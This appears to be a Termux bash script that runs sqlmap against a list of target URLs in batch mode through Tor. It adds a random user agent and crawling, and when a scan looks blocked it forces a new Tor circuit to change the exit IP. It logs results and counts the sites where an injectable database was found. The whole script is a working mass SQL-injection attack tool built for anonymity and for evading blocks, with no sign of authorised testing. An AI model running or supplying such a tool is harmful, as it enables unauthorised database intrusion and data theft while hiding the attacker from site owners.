#!/data/data/com.termux/files/usr/bin/bash

GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${GREEN}🛡️ SQLMap via Tor - Smart Runner [SqlTor4.sh]${RESET}"

# Start Tor if not already running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor...${RESET}"
    tor & sleep 5
fi

# URL input
read -p "📁 URL list file (one per line): " url_file
if [[ -f "$url_file" ]]; then
    urls=$(cat "$url_file")
else
    echo -e "${RED}[!] File not found: $url_file${RESET}"
    read -p "🌐 Enter single target URL manually: " single_url
    urls="$single_url"
fi

read -p "⚙️ Extra SQLMap options (e.g. --dbs --current-user): " extra_opts
read -p "🌀 Crawl level (default 1): " crawl_level
crawl_level="${crawl_level:-1}"

mkdir -p logs
tor_ip_before=$(torsocks curl -s https://ifconfig.me)
echo -e "➡️ Tor IP before scan: ${BLUE}${tor_ip_before}${RESET}"

total=0
success=0
vuln=0
fail=0

for url in $urls; do
    [[ -z "$url" ]] && continue
    total=$((total + 1))
    echo -e "\n${YELLOW}[${total}] 🔍 Scanning: $url${RESET}"

    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    start_time=$(date +%s)
    torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent --crawl="$crawl_level" --batch \
        --tor --tor-type=SOCKS5 $extra_opts 2>&1 | tee "$log_file"
    exit_code=$?
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    [[ $duration -lt 10 ]] && duration=10

    if [[ $exit_code -eq 0 ]]; then
        success=$((success + 1))
        echo -e "${GREEN}📝 Log saved to: $log_file${RESET}"
        
        if grep -q "back-end DBMS" "$log_file"; then
            vuln=$((vuln + 1))
            echo -e "${RED}⚠️ Vulnerability Detected!${RESET}"
        else
            echo -e "${BLUE}✅ Scan completed (No vuln)${RESET}"
        fi
    else
        fail=$((fail + 1))
        echo -e "${RED}❌ Scan failed or blocked${RESET}"
    fi

    # Rotate IP if blocked
    tor_ip_after=$(torsocks curl -s https://ifconfig.me)
    if [[ "$tor_ip_after" == "$tor_ip_before" ]]; then
        echo -e "${YELLOW}🔁 Rotating Tor IP...${RESET}"
        pkill -HUP tor
        sleep 10
        tor_ip_before=$(torsocks curl -s https://ifconfig.me)
        echo -e "${BLUE}🔄 New Tor IP: $tor_ip_before${RESET}"
    else
        tor_ip_before="$tor_ip_after"
    fi

    echo -e "⏱️ Sleeping for ${duration}s..."
    sleep "$duration"
done

# 🛎️ Final Notification-style Summary
echo -e "\n${GREEN}🔔 FINAL SUMMARY:${RESET}"
echo -e "${BLUE}🧩 Targets Scanned:${RESET} $total"
echo -e "${GREEN}✅ Successful:${RESET} $success"
echo -e "${RED}⚠️ Vulnerable:${RESET} $vuln"
echo -e "${YELLOW}❌ Skipped or Failed:${RESET} $fail"
echo -e "${BLUE}📁 Logs saved to:${RESET} logs/"

